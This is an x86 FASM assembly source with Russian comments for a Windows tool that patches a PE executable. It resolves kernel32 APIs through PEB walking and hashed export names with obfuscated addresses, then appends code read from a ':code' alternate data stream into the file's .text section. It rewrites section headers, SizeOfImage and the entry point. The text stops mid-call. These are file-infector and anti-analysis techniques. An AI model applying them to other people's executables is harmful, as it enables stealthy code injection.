format PE console
entry start

include 'C:\fasmw17332\INCLUDE\WIN32AX.INC'

struc STARTUPINFOA
{
	.cb 					dd 0x44		; 68 байт
	.lpReserved 			dd 0x00
	.lpDesktop 				dd 0x00
	.lpTitle 				dd 0x00
	.dwX 					dd 0x00
	.dwY 					dd 0x00
	.dwXSize 				dd 0x00
	.dwYSize 				dd 0x00
	.dwXCountChars 			dd 0x00
	.dwYCountChars 			dd 0x00
	.dwFillAttribute 		dd 0x00
	.dwFlags 				dd 0x00
	.wShowWindow 			dw 0x00
	.cbReserved2 			dw 0x00
	.lpReserved2 			dd 0x00
	.hStdInput 				dd 0x00
	.hStdOutput 			dd 0x00
	.hStdError 				dd 0x00
}

struc PROCESS_INFORMATION
{
	.hProcess				dd 0x00
	.hThread				dd 0x00
	.dwProcessId			dd 0x00
	.dwThreadId				dd 0x00
}


szBuffer = 0x200			; 512 байт

sectionAlig = 0x1000		; размер вирт. выравнивания
fileAlig = 0x200			; размер файлового выравнивания

rawAddrOfEntryPoint = 0xA8	; смещение этого поля
rawSizeOfImage = 0xD0		; смещение этого поля
rawFirstSecHeader = 0x0178	; смещение первого секц. заголовка

rawMy_func_table = 0x187e			; смещенине начала таблицы моих фукнций

section '.data' data readable writeable
	buffer db szBuffer dup (0x00)		; буфер общего назначения
	buf dd 0x00
	
	; Взаимодействие с процессами
	prinfo PROCESS_INFORMATION
	stinfo STARTUPINFOA
	filename dd 0x00				; адрес строки с название файла
	
	; Адреса таблиц функций загруженных dll
	addr_kernel32_table	dd 0x00			; адрес таблицы функций kernel32.dll
	
	hMainFile dd 0x00				; дескр. файла что патчим
	szMainFile dd 0x00				; размер файла
	hCodeFile dd 0x00				; дескр. файла с кодом	
	szCodeFile dd 0x00				; размер файла с кодом 
	hGlob dd 0x00 					; дескр глоб памяти
	
	sizeOfImage dd 0x00				; 
	offsetEntryPoint dd 0x00		; смещение точки входа в секции .text
	
	dataVS dd 0x00 					; virtual size data section
	dataRVA dd 0x00 				; r virtual address data section
	dataSzOfRawData dd 0x00 		; file size data section
	dataPointerToRawData dd 0x00 	; file address (raw) data section
	
	textVS dd 0x00 					; virtual size text section (будем использовать как смещение нов функции в .text)
	textRVA dd 0x00 				; r virtual address text section
	textSzOfRawData dd 0x00 		; file size text section
	textPointerToRawData dd 0x00 	; file address (raw) text section
	
	newTextVS dd 0x00
	newTextRVA dd 0x00
	newTextSzOfRawData dd 0x00
	newTextPointerToRawData dd 0x00
	
	rawTableEntry dd 0x00			; raw нужной нам записи
	
	incDataSectionV db 0x00			; во сколько раз увеличить секцию Data виртуально
	incDataSectionF db 0x00			; во сколько раз увеличить секцию Data файлово
	incTextSectionV db 0x00			; во сколько раз увеличить секцию Text виртуально
	incTextSectionF db 0x00			; во сколько раз увеличить секцию Text файлово

section '.text' code readable executable

; ======= ФУНКЦИЯ ПОЛУЧЕНИЯ VA ЗАГРУЗКИ МОДУЛЯ =======
; IN	al - флаг, ищем dll или exe
; IN 	cx - сумма символов названия dll
; OUT 	ebx - VA загрузки dll 
proc get_VA_module
	mov ebx, [fs:0x30]			; peb
	
	mov ebx, [ebx + 0x0C]		; peb_ldr_data
	mov ebx, [ebx + 0x14]		; inMemoryOrderModuleList (first)
	
	cmp al, 0x01				; если нужен VA exe
	je .get_moduleBase
	
.find_module:
	mov esi, [ebx + 0x20]		; FullDllName

.calc_checksum:
	xor edx, edx
	
.iter:
	lodsw
	
	cmp ax, 0x00
	je .check
	
	cmp ax, 0x5c
	je .calc_checksum
	
	add dx, ax
	jmp .iter
	
.check:
	cmp dx, cx					; сумма символов названия dll			
	je .get_moduleBase
	
	mov ebx, [ebx]
	jmp .find_module
	
	
.get_moduleBase:
	mov ebx, [ebx + 0x10]		; dllBase VA
	
	ret
endp
; ====================================================

; ======= ФУНКЦИЯ ХЕШИРОВАНИЯ НАЗВАНИЯ ФУНКЦИИ =======
; IN 	esi - адрес строки
; IN	[esp + 4] - символ конца строки
; OUT 	edx - криптограмма
proc get_hash_func_name
	xor eax, eax
	xor edx, edx
	
	mov ecx, 0
.calc_hash:
	lodsb 
	cmp al, byte [esp + 4]
	je .save_hash
	
	inc ecx						; с 1 до длины имени
	add edx, eax				; прибавляем букву
	ror edx, cl
	add edx, eax				; прибавляем букву
	xor edx, ecx				
	
	jmp .calc_hash

.save_hash:
	ret 0x04
endp
; ====================================================

; ----------------------------------------------------------
; Запись [хеш от имени: 4 байта, криптограмма VA: 4 байта]
; Конец таблицы - нулевая запись
; ----------------------------------------------------------
; ======= ФУНКЦИЯ ЗАПОЛНЕНИЯ ТАБЛИЦЫ ФУНКЦИЙ В СТЕКЕ =======
; IN 	ebx - VA загрузки dll
; OUT 	eax - VA начала таблицы
proc create_table
	; Сохраняем адрес возврата
	mov edi, [esp]	
	add esp, 0x04
	
	; Получаем VA структуры _IMAGE_EXPORT_DIRECTORY
	mov esi, [ebx + 0x3C]		; RAW _IMAGE_NT_HEADERS (e_lfanew)
	lea esi, [ebx + esi]		; VA _IMAGE_NT_HEADERS
	mov esi, [esi + 0x78]		; RVA _IMAGE_EXPORT_DIRECTORY 
	add esi, ebx				; VA _IMAGE_EXPORT_DIRECTORY
	
	; Получаем размер массива AddressOfNames
	mov ecx, [esi + 0x18]		; NumberOfNames
	
	; Резервируем место в стеке под таблицу
	mov edx, ecx
	inc ecx						; для того, чтобы выделить место нулевую запись
.reserve_stack:
	push 0x00					; место под хеш названия фукнции 		
	push 0x00					; место под криптограмму VA функции	
	loop .reserve_stack
	mov ecx, edx	
	
	; Сохраняем адрес возврата 
	push edi
	
	; Сохраняем в стек VA массивов структуры _IMAGE_EXPORT_DIRECTORY
	mov edx, [esi + 0x1C]		; RVA массива AddressOfFunctions
	add edx, ebx				; VA массива AddressOfFunctions
	push edx
	mov edx, [esi + 0x24]		; RVA массива AddressOfNameOrdinals
	add edx, ebx				; VA массива AddressOfNameOrdinals
	push edx
	mov edx, [esi + 0x20]		; RVA массива AddressOfNames
	add edx, ebx				; VA массива AddressOfNames
	push edx
	
; Состояние программы 
; Регистры:
; ebx 			VA загрузки dll
; ecx 			количество элементов в AddressOfNames
; Стек:
; [esp + 0x00]	VA массива AddressOfNames
; [esp + 0x04]	VA массива AddressOfNameOrdinals 
; [esp + 0x08]	VA массива AddressOfFunctions
; [esp + 0x0C]	VA возврата
; [esp + 0x10]	начало таблицы 
	
	; Заполняем таблицу
.fill_table:
	dec	ecx	
	
	; Получаем VA названия функции
	mov esi, [esp]				; VA массива AddressOfNames
	mov esi, [esi + ecx*0x04]	; RVA строки названия функции
	add esi, ebx				; VA строки названия функции
	
	; Создаем хеш названия функции
	push ecx					; сохраняем зн ecx
	push 0x00					; символ конца строки
	call get_hash_func_name
	pop ecx 					; достаем зн ecx
	
	; Сохраняем хеш
	lea edi, [esp + 0x10 + ecx*0x08]	; VA записи в таблице
	mov [edi], edx				; сохраняем хеш
	
	; Получаем индекс фукнции
	mov esi, [esp + 0x04]				; VA массива AddressOfNameOrdinals 
	movzx eax, word [esi + ecx*0x02]	; получаем индекса функции
	
	; Получаем криптограмму VA функции
	mov esi, [esp + 0x08]				; VA массива AddressOfFunctions
	mov esi, [esi + eax*0x04]			; RVA функции
	
	lea edi, [esp + 0x14 + ecx*0x08]	; адрес сохранения криптограммы VA функции
	add esi, [edi - 0x04]				; прибавляем к RVA хеш
	add esi, ebx						; RVA функции + хеш + VA загрузки
	
	push ecx 					; сохраняем зн ecx
	
	mov ecx, [edi - 0x04]		; хеш
	ror esi, cl					; ror (RVA функции + хеш + VA загрузки) на байт хеша
	xor esi, ecx				; xor (ror (RVA функции + хеш + VA загрузки) на байт хеша) и хеша
	mov [edi], esi				; сохранение криптограммы VA функции
	
	pop ecx						; достаем зн ecx
	
	inc ecx
	loop .fill_table
	
	lea eax, [esp + 0x10]		; начало таблицы 
	add esp, 0x0C				; освобождаем места VAes массивов структуры _IMAGE_EXPORT_DIRECTORY
	
	ret
endp
; ==========================================================

; ======= ФУНКЦИЯ ПОЛУЧЕНИЯ АДРЕСА ФУНКЦИИ (В .DATA И СТЕКЕ) =======
; IN 	esi - адрес начала таблицы
; IN 	ebx - хеш названия фукнции
; OUT 	eax - адрес функции (0x00 - адрес не найден)
proc get_func_addr
.find_func_addr:
	lodsd						; считываем хеш 
	
	cmp eax, 0x00				; проверка на конец таблицы
	jne .not_end	
	
	xor eax, eax				; подготовка результата 0x00
	jmp .ret_zero
	
.not_end:
	cmp eax, ebx				; сверка хешей
	je .ret_addr
	
	add esi, 0x04				; адрес следующей записи в таблице
	jmp .find_func_addr
	
.ret_addr:
	lodsd						; криптограмма адреса (xor (ror (адрес функции + хеш) на байт хеша) и хеша)
	
	xor eax, ebx				; получаем ror (адрес функции + хеш) на байт хеша
	
	push ecx					; сохраняем зн ecx
	mov cl, bl
	rol eax, cl					; получаем адрес функции + хеш

	sub eax, ebx				; получаем адрес функции
	pop ecx						; достаем зн ecx
	
.ret_zero:
	ret
endp
; ==================================================================

; ======= ФУНКЦИЯ ПОЛУЧЕНИЯ ДЕСКРИПТОРОВ И РАЗМЕРОВ ФАЙЛОВ =======
; IN 	buffer - навзвание файла
; IN/OUT 	[esp + 0x04] - адрес под дескриптор
; IN/OUT 	[esp + 0x08] - адрес под размер файла
proc get_file_info
	; Получаем VA CreateFileA
	mov esi, [addr_kernel32_table]
	mov ebx, 0x7B2B7316		
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00					; hTemplateFile
	push 0x80 					; normal dwFlagsAndAttributes
	push 0x03					; existing dwCreationDisposition
	push 0x00					; lpSecurityAttributes
	push 0x00 					; dwShareMode
	push 0xC0000000 			; read write dwDesiredAccess
	push buffer					; lpFileName
	call eax					; CreateFileA
	
	cmp eax, 0x00
	jle end_prog				; если файл не открылся
	
	; Сохраняем дескриптор
	mov ecx, dword [esp + 0x04]
	mov [ecx], eax
	
	; Получаем VA GetFileSize 
	mov esi, [addr_kernel32_table]
	mov ebx, 0x2D9A144D		 
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	mov ecx, dword [esp + 0x04]
	push 0x00					; lpFileSizeHigh
	push dword [ecx]			; hFile 
	call eax					; GetFileSize
	
	cmp eax, 0xFFFFFFFF
	je end_prog
	
	; Сохраняем размер файла
	mov ecx, dword [esp + 0x08]
	mov dword [ecx], eax
	
	ret 0x08
endp	
; ================================================================

start:
	nop
	
; ========== ПОДГОТОВКА ПРИЛОЖЕНИЯ К РАБОТЕ ========== 
	; Получаем VA загрузки kernel32.dll
	xor al, al
	mov cx, 0x0450
	call get_VA_module

	; Заполняем в стеке таблицу функций kernel32.dll
	call create_table
	mov [addr_kernel32_table], eax
; --------------------------------------------------------------	
; Ждем завершения работы основного файла
	; Получаем VA Sleep
	mov esi, [addr_kernel32_table]
	mov ebx, 0x3D160072			
	call get_func_addr			
	
	cmp eax, 0x00
	je end_prog
	
	push 0x2710					; dwMilliseconds (10с)
	call eax					; Sleep	
; --------------------------------------------------------------
; Получаем названия основного файла
	; Получаем VA GetCommandLineA
	mov esi, [addr_kernel32_table]
	mov ebx, 0xC41DB48D
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	call eax					; GetCommandLineA
	mov dword [filename], eax	; сохраняем адрес строки
	
	; обработка ком. строки
	mov esi, eax				; строка
	xor ecx, ecx				; счетчик символов
	
find_file_name:
	inc ecx
	lodsb
	
	cmp al, 0x22				; '"'
	je next_word
	
	cmp al, 0x3A				; ':'
	je save_file_name
	jmp find_file_name
	
next_word:
	xor ecx, ecx
	jmp find_file_name
	
save_file_name:
	sub esi, ecx				; переходим в начало названия файла
	mov edi, buffer
	dec ecx
	push ecx					; сохр. длины названия файла
	
	; Записываем название основного файла в буфер
save_file_name_iter:
	movsb
	loop save_file_name_iter
	mov byte [edi], 0x00		; конец строки
	
; ========== СБОР ДАННЫХ СТРУКУРЫ PE ========== 	
; Получаем инфо об основном файле 
	push szMainFile
	push hMainFile
	call get_file_info
; --------------------------------------------------------------
; Генерируем строку файла с кодом
	pop ecx
	mov esi, buffer
	add esi, ecx
	mov byte [esi], 0x3A		;':'
	inc esi
	mov byte [esi], 0x63		;'c'
	inc esi
	mov byte [esi], 0x6F		;'o'
	inc esi
	mov byte [esi], 0x64		;'d'
	inc esi
	mov byte [esi], 0x65		;'e'

; --------------------------------------------------------------
; Получаем инфо о файла с кодом
	push szCodeFile
	push hCodeFile
	call get_file_info
	
	; Из полученного размера получаем размер функции
	mov eax, [szCodeFile]
	sub eax, 0x05			; служеб инф вычетаем
	mov [szCodeFile], eax 
; --------------------------------------------------------------
; Сохраянем копию основного файла в куче
	; Получаем VA GlobalAlloc
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9ED8E9E0			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push dword [szMainFile]		; dwBytes
	push 0x00					; GMEM_FIXED uFlags
	call eax					; GlobalAlloc
	
	cmp eax, 0x00 
	je end_prog
	mov dword [hGlob], eax
	
	; Получаем VA ReadFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0xAFB3BF8D			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; lpOverlapped
	push buffer 				; lpNumberOfBytesRead
	push [szMainFile]			; nNumberOfBytesToRead
	push [hGlob]				; lpBuffer
	push [hMainFile]			; hFile
	call eax 					; ReadFile
	
	cmp eax, 0x00
	je end_prog
; --------------------------------------------------------------
; Сохраняем поля PE файла 
	; sizeOfImage
	mov esi, dword [hGlob]
	add esi, rawSizeOfImage
	lodsd
	mov [sizeOfImage], eax
	
; Сохраняем данные секций .data и .text
	mov ecx, 0x02
	mov edi, dataVS
	
	mov esi, dword [hGlob]
	add esi, rawFirstSecHeader
	add esi, 0x28 					; пропуск заголовок секции idata
	
save_sections_data:
	add esi, 0x08
	movsd							; VS
	movsd							; RVA
	movsd							; SzOfRawData
	movsd							; PointerToRawData
	add esi, 0x10					; смещение до след заголовка
	loop save_sections_data
	
	; offsetEntryPoint
	mov esi, dword [hGlob]
	add esi, rawAddrOfEntryPoint
	lodsd
	sub eax, [textRVA]
	mov [offsetEntryPoint], eax
	
; ========== ПАТЧИНГ ========== 	
; Определяем, добавляем или удаляем доп функцию в файл
	; Получаем VA ReadFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0xAFB3BF8D			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; lpOverlapped
	mov ecx, buffer
	add ecx, 0x10
	push ecx 					; lpNumberOfBytesRead
	push 0x01					; nNumberOfBytesToRead [что делать]
	push buffer					; lpBuffer
	push [hCodeFile]			; hFile
	call eax 					; ReadFile
	
	cmp eax, 0x00
	je end_prog
	
	cmp byte [buffer], 0x01
	je add_func						; добавляем функцию в файл
	
	cmp byte [buffer], 0x00
	je del_func						; удадяем функцию из файла
	
	jmp end_prog				; иначе конец завершить программу	

; --------------------------------------------------------------
; Добавляем функцию
add_func:
; Ставим указатель на начало моей таблицы фукнций
	; Получаем VA SetFilePointer
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9A94D85			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; SetFilePointer FILE_BEGIN
	push 0x00					; lpDistanceToMoveHigh
	push rawMy_func_table		; lDistanceToMove
	push [hMainFile] 			; hFile
	call eax 					; SetFilePointer
	
	cmp eax, 0xFFFFFFFF			; INVALID_SET_FILE_POINTER
	je end_prog
	
	; Получаем VA ReadFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0xAFB3BF8D			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push eax 					; сохр VA функции ReadFile
; поиск конца таблицы
find_end_table:
	pop eax 
	push eax
	
	; Считываем поле таблицы
	push 0x00 					; lpOverlapped
	mov ecx, buffer
	add ecx, 0x10
	push ecx 					; lpNumberOfBytesRead
	push 0x08					; nNumberOfBytesToRead
	push buffer					; lpBuffer
	push [hMainFile]			; hFile
	call eax 					; ReadFile
	
	cmp eax, 0x00
	je end_prog
	
	cmp dword [buffer], 0x00	; проверка на конец таблицы
	je get_raw_end_my_table
	jmp find_end_table

; Получаем смещение для новой записи в таблице
get_raw_end_my_table:
	pop eax 					; удаляем VA фукнции  ReadFile
	
	; Получаем VA SetFilePointer
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9A94D85			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x01 					; SetFilePointer FILE_CURRENT
	push 0x00					; lpDistanceToMoveHigh
	push 0x00					; lDistanceToMove
	push [hMainFile] 			; hFile
	call eax 					; SetFilePointer
	
	cmp eax, 0xFFFFFFFF			; INVALID_SET_FILE_POINTER
	je end_prog
	
	; сохраняем смещение для новой записи
	sub eax, 0x08
	mov dword [rawTableEntry], eax 	
; --------------------------------------------------------------
; Определяем, надо ли увеличивать секцию .data
; В файле
	mov ebx, [textRVA]					; RVA след секции
	sub ebx, [dataRVA]					; получаем виртуальный размер секции 
	mov [dataVS], ebx 					; сохраняем размер секции начальный
	
	add eax, 0x10					; raw байта после таблицы (прибавляем место под запись и 0 запись)
	push eax						; raw байта после таблицы
	sub eax, [textPointerToRawData] ; вычитаем raw след секции
	js write_sec_data_h				; если результат отрицательный - значит увеличивать секцию не надо 
	
	; во сколько раз надо увеличить секцию в файле
	mov ebx, fileAlig
	xor edx, edx
	div ebx
	
	cmp edx, 0x00
	je no_rem_fd					; нет остатка от деления 
	inc eax 					; округляем в большую сторону 
	
no_rem_fd:
	mov [incDataSectionF], al	; во сколько раз надо увеличить секцию в файле
	
; В памяти
	pop eax 							; raw байта после таблицы
	sub eax, [dataPointerToRawData]		; выч raw секции data (получаем размер секции)
	
	mov ebx, [dataVS] 					; сохраняем размер секции начальный
	sub eax, ebx						; вычитаем вирт размер секции 
	js write_sec_data_h					; если результат отрицательный - значит увеличивать не надо секцию в вирт памяти
	
	; во сколько раз надо увеличить секцию в памяти
	mov ebx, sectionAlig
	xor edx, edx
	div ebx
	
	cmp edx, 0x00
	je no_rem_vd					; нет остатка от деления 
	inc eax 					; округляем в большую сторону 
	
no_rem_vd:
	mov [incDataSectionV], al	; во сколько раз надо увеличить секцию в памяти

; --------------------------------------------------------------
; Заполняем заголовок секции .data	
write_sec_data_h:
; Переставляем указатель
	; Получаем VA SetFilePointer
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9A94D85	 
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; SetFilePointer FILE_BEGIN
	push 0x00					; lpDistanceToMoveHigh
	mov ecx, 0x30				; смещение VS data
	add ecx, rawFirstSecHeader
	push ecx					; lDistanceToMove
	push [hMainFile] 			; hFile
	call eax 					; SetFilePointer
	
	cmp eax, 0xFFFFFFFF			; INVALID_SET_FILE_POINTER
	je end_prog

; Формируем строку
	; изменение dataSzOfRawData
	movzx eax, byte [incDataSectionF]	; во сколько раз надо увеличить в файле секцию
	mov ebx, fileAlig
	mul ebx
	add eax, [dataSzOfRawData]
	mov [dataSzOfRawData], eax 				; новый размер секции data в файле

	; получение нового TextPointerToRawData
	add eax, [dataPointerToRawData]
	mov [newTextPointerToRawData], eax 		; новое смещение секции text
	
	; изменение dataVS
	movzx eax, byte [incDataSectionV]	; во сколько раз надо увеличить в памяти
	mov ebx, sectionAlig
	mul ebx
	add eax, [dataVS]
	mov [dataVS], eax			; новый размер секции в памяти
	
	; получение нового TextRVA
	add eax, [dataRVA]
	mov [newTextRVA], eax 		; новый RVA секции text
	
; Записываем строку (патчим заголовок .data)
	; Получаем VA WriteFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0x0684B82A			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00  					; lpOverlapped
	push buffer 				; lpNumberOfBytesWritten
	push 0x10 					; nNumberOfBytesToWrite
	push dataVS					; lpBuffer
	push [hMainFile] 			; hFile
	call eax					; WriteFile
	
	cmp eax, 0x00
	je end_prog
; --------------------------------------------------------------	
; Выравниваем секцию data в файле 
	mov ecx, [rawTableEntry]	; raw новой записи
	push ecx
	
	; Получаем VA SetFilePointer
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9A94D85			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	pop ecx
	push ecx
	
	push 0x00 					; SetFilePointer FILE_BEGIN
	push 0x00					; lpDistanceToMoveHigh
	push ecx					; lDistanceToMove
	push [hMainFile] 			; hFile
	call eax 					; SetFilePointer
	
	cmp eax, 0xFFFFFFFF			; INVALID_SET_FILE_POINTER
	je end_prog
	
	mov byte [buffer], 0x00		; байт для заполнения
	
	; Сколько байт надо выравнивать
	mov ecx, [newTextPointerToRawData]
	pop eax						; raw новой записи
	sub ecx, eax				; колво байт
	
	;выравн секцию дата
do_data_FileAlig:
	push ecx
	
	; Получаем VA WriteFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0x0684B82A			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00  					; lpOverlapped
	lea ecx, [buffer + 0x10]
	push ecx					; lpNumberOfBytesWritten
	push 0x01 					; nNumberOfBytesToWrite
	push buffer					; lpBuffer
	push [hMainFile] 			; hFile
	call eax					; WriteFile
	
	cmp eax, 0x00
	je end_prog
	
	pop ecx
	loop do_data_FileAlig
; --------------------------------------------------------------	
; Записываем секцию text
	; VA WriteFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0x0684B82A			; WriteFile
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	mov esi, [hGlob]				; VA копии файла
	add esi, [textPointerToRawData] ; raw смещение начала секции text
	
	push 0x00  					;lpOverlapped
	lea ecx, [buffer + 0x10]
	push ecx					; lpNumberOfBytesWritten
	push [textVS] 				; nNumberOfBytesToWrite
	push esi					; lpBuffer
	push [hMainFile] 			; hFile
	call eax					; WriteFile
	
	cmp eax, 0x00
	je end_prog 
	
; --------------------------------------------------------------
; Определяем, надо ли увеличивать секцию .text
; В файле 
	mov eax, [szCodeFile]			; размер новой функции
	add eax, [textVS] 				; получается размер секции с учетом новой функции
	mov [newTextVS], eax			; сохр нов размер секции
	
	push eax

	sub eax, [textSzOfRawData] 		; нов размер больше или нет размера секции в файле 
	js write_sec_text				; если отрицательный рез. то переходим к заполнию секции
	
	; во сколько раз надо увеличить секцию в файле
	mov ebx, fileAlig
	xor edx, edx
	div ebx
	
	cmp edx, 0x00
	je no_rem_ft			; нет остатка от деления
	inc eax					; окр в большую сторону
	
no_rem_ft:
	mov [incTextSectionF], al

; В памяти
	mov ebx, [sizeOfImage]
	sub ebx, [textRVA]		; размер секции в памяти
	
	pop eax					; размер секции с учетом нов фукнции
	sub eax, ebx			
	js write_sec_text		; если отр, то заполняем файл
	
	; во сколько раз надо увеличить секцию в памяти
	mov ebx, sectionAlig
	xor edx, edx
	div ebx
	
	cmp edx, 0x00
	je no_rem_vt
	inc eax 
	
no_rem_vt:
	mov [incTextSectionV], al

; --------------------------------------------------------------
; Записываем новую фукнцию		
write_sec_text:
	cmp [newTextPointerToRawData], 0x00
	jne new_text_raw
	
	mov eax, [textPointerToRawData]
	mov [newTextPointerToRawData], eax			; перезаписываем raw секции

new_text_raw:
; Перемещаем указатель на начало записи нов функции
	; VA SetFilePointer
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9A94D85			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	; указатель на байт, с которого писать функцию
	push 0x00 					; SetFilePointer FILE_BEGIN
	push 0x00					; lpDistanceToMoveHigh
	mov ecx, [newTextPointerToRawData]
	add ecx, [textVS]			; получаем смещение, с котор надо записывать доп фукнцию
	push ecx					; lDistanceToMove
	push [hMainFile] 			; hFile
	call eax 					; SetFilePointer
	
	cmp eax, 0xFFFFFFFF			; INVALID_SET_FILE_POINTER
	je end_prog
	
; Перемещаем указатель на функцию
	; VA SetFilePointer
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9A94D85			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	; указатель на фукнцию [type: 1, name: 4]
	push 0x00 					; SetFilePointer FILE_BEGIN
	push 0x00					; lpDistanceToMoveHigh
	push 0x05					; lDistanceToMove - начала кода фукнции
	push [hCodeFile] 			; hFile
	call eax 					; SetFilePointer
	
	cmp eax, 0xFFFFFFFF			; INVALID_SET_FILE_POINTER
	je end_prog

; записываем в конец секции text функцию
write_text_func:
	; Получаем VA ReadFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0xAFB3BF8D			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; lpOverlapped
	push buf	 				; lpNumberOfBytesRead
	push 200					; nNumberOfBytesToRead
	push buffer					; lpBuffer
	push [hCodeFile]			; hFile
	call eax 					; ReadFile
	
	cmp eax, 0x00
	je end_prog
	
	cmp [buf], 0x00			; проверяем колво считанных байт
	je end_write_text_func
	
	push [buf]				; колво считанных байт нужной фукнции
	; Получаем VA WriteFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0x0684B82A			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	pop ecx
	
	push 0x00  					; lpOverlapped
	push buf					; lpNumberOfBytesWritten
	push ecx 					; nNumberOfBytesToWrite
	push buffer					; lpBuffer
	push [hMainFile] 			; hFile
	call eax					; WriteFile
	
	cmp eax, 0x00
	je end_prog
	
	jmp write_text_func
	
end_write_text_func:
; --------------------------------------------------------------
; выравниваем секцию по файловому выравниванию
	; Заполняем размер секции в файле. (стартовое зн)
	mov eax, [textSzOfRawData]
	mov [newTextSzOfRawData], eax
	
	; Определяем количество байт, что надо выравнять секцию
	movzx ebx, [incTextSectionF]
	cmp ebx, 0x00					; выравнивание не нужно. функция записалась в пещеру секции
	je write_sec_text_h				
	
	mov eax, fileAlig
	mul ebx							; умножаем на коэф (на сколько надо увеличить)
	add eax, [textSzOfRawData]		; размер выровненной секции
	mov [newTextSzOfRawData], eax 	; сохр размер выр секции
	sub eax, [newTextVS]			; колво байт, что надо выровнять
	
	; выравниваем
	mov ecx, eax
	mov byte [buffer], 0x00
do_text_FileAlig:
	push ecx
	
	; Получаем VA WriteFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0x0684B82A			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00  					; lpOverlapped
	lea ecx, [buffer + 0x10]
	push ecx					; lpNumberOfBytesWritten
	push 0x01 					; nNumberOfBytesToWrite
	push buffer					; lpBuffer
	push [hMainFile] 			; hFile
	call eax					; WriteFile
	
	cmp eax, 0x00
	je end_prog
	
	pop ecx
	loop do_text_FileAlig
	
write_sec_text_h:	
; --------------------------------------------------------------
; Записываем строку (патчим заголовок .text)
	; Переставляем указатель
	; Получаем VA SetFilePointer
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9A94D85	 
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; SetFilePointer FILE_BEGIN
	push 0x00					; lpDistanceToMoveHigh
	push 0x01D0					; lDistanceToMove VS text
	push [hMainFile] 			; hFile
	call eax 					; SetFilePointer
	
	cmp eax, 0xFFFFFFFF			; INVALID_SET_FILE_POINTER
	je end_prog

	; Получаем VA WriteFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0x0684B82A			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00  					; lpOverlapped
	push buffer 				; lpNumberOfBytesWritten
	push 0x10 					; nNumberOfBytesToWrite
	push newTextVS				; lpBuffer
	push [hMainFile] 			; hFile
	call eax					; WriteFile
	
	cmp eax, 0x00
	je end_prog
; --------------------------------------------------------------
; Записываем SizeOfImage
	movzx eax, byte [incTextSectionV]	; на сколько раз надо увеличить в памяти
	mov ebx, sectionAlig
	mul ebx
	add eax, [sizeOfImage]
	mov [sizeOfImage], eax		; новый размер файла в памяти
	
	; Переставляем указатель
	; Получаем VA SetFilePointer
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9A94D85	 
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; SetFilePointer FILE_BEGIN
	push 0x00					; lpDistanceToMoveHigh
	push rawSizeOfImage			; lDistanceToMove
	push [hMainFile] 			; hFile
	call eax 					; SetFilePointer
	
	cmp eax, 0xFFFFFFFF			; INVALID_SET_FILE_POINTER
	je end_prog
	
	; Получаем VA WriteFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0x0684B82A			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00  					; lpOverlapped
	push buffer 				; lpNumberOfBytesWritten
	push 0x04 					; nNumberOfBytesToWrite
	push sizeOfImage			; lpBuffer
	push [hMainFile] 			; hFile
	call eax					; WriteFile
	
	cmp eax, 0x00
	je end_prog
; --------------------------------------------------------------	
; Записываем AddrOfEntryPoint
	mov eax, [newTextRVA] 
	add eax, [offsetEntryPoint]
	mov [offsetEntryPoint], eax	; rva точки входа
	
	; Переставляем указатель
	; Получаем VA SetFilePointer
	mov esi, [addr_kernel32_table]
	mov ebx, 0x9A94D85	 
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00 					; SetFilePointer FILE_BEGIN
	push 0x00					; lpDistanceToMoveHigh
	push rawAddrOfEntryPoint	; lDistanceToMove
	push [hMainFile] 			; hFile
	call eax 					; SetFilePointer
	
	cmp eax, 0xFFFFFFFF			; INVALID_SET_FILE_POINTER
	je end_prog
	
	; Получаем VA WriteFile
	mov esi, [addr_kernel32_table]
	mov ebx, 0x0684B82A			
	call get_func_addr
	
	cmp eax, 0x00
	je end_prog
	
	push 0x00  					; lpOverlapped
	push buffer 				; lpNumberOfBytesWritten
	push 0x04 					; nNumberOfBytesToWrite
	push offsetEntryPoint		; lpBuffer
	push [hMainFile] 			; hFile
